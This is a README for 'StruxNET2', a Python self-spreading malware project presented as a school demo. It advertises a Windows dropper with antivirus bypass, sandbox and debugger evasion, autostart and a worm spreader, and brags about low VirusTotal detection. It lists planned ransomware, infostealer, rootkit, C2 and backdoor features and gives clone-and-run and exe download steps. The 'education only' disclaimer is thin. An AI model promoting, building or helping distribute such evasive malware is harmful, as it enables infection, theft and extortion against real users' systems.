# StruxNET2
A Python-based Malware that reproducet itself. Its a demo/education project for my school so.

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X7MF230)


**DISCLAIMER: This is for education Purpose ONLY! I dont support any kind of illegal activitys!**
**This Project is still Work-on-Progress**

# Version 1.1
**Main Changes**
- StruxNET2 now split into Linux Payload and Windows Payload (Used as Dropper or entrypoint)

**Windows Payload (dropper)**
- AV Bypass [Windows Defender ONLY]
- VM Detection (Low)
- Autostart payload
- Detect Debugging ENV (low)
- Detect Virustotal (Maybe patched soon)
- Use UAC (Use pyinstaller for this)
- Impvoved Worm (spreader)
- Improved antiAV Detection (Virustotal scan: 7/71) [Maybe soon fixed]
  [Virustotal Result](https://www.virustotal.com/gui/file/ed0653164b2d32a1ccae396939480f9761cb903472a900c5d70225ed8e0254f7/detection)

**Linux Payload**
- Improved Runtime speed a little bit

# Active state of Development
**Windows Payload**: ~60%
**Linux Payload**: ~30%

**Planed Windows**
- Comment all functions
- Infostealer (Maybe)
- C2 Function (Maybe)
- Ransomware feature (Maybe)
- File Infection [To prevent from deleting]
- get the Worm Multithreading acces to spread faster
- RAT/Backdoor (Maybe)
- customization features
- Run fully payload stealth (No visible Console window)

**Planed Linux**
- Rootkit Feature (get Root access)
- Ransomware (Maybe)
- C2 (Maybe)
- File Infection [To prevent from deleting]
- Autostart like in windows
- Improve Performance
- get the Worm Multithreading acces to spread faster
- Backdoor acces/RAT (Maybe)
- customization features
- Run Stealth in background without a console window

**Planed just for fun**
- a Loader to build a own version without any knowledge
Soon More, Fell free to post ideas in Issues Tab :)

Feel also free to make a own version of StruxNET2 lol (But please leave credits)


## How to Use (Remind: IT IS MALWARE! Dont use at your main system! i dont take any Response for Damages!!)
**Prerequisites**  
* Windows maschine or Linux
* For Linux: python3 and pip3
 
### Linux:
`sudo apt update`  
`sudo apt-get install git` <== Skip this if you have it already  
`git clone https://github.com/Crafttino21/StruxNET2.git`  
`pip install -r requirments.txt`
`python3 StruxNET2-Linux.py`

### Windows
`go to Releases`
`Install StruxNET2-Windows.exe`
`Run it!`
   

 

Credits: I used some code from [Here](https://github.com/PatrikH0lop/malware_showcase/tree/master) and improved/change it but still used some parts from there
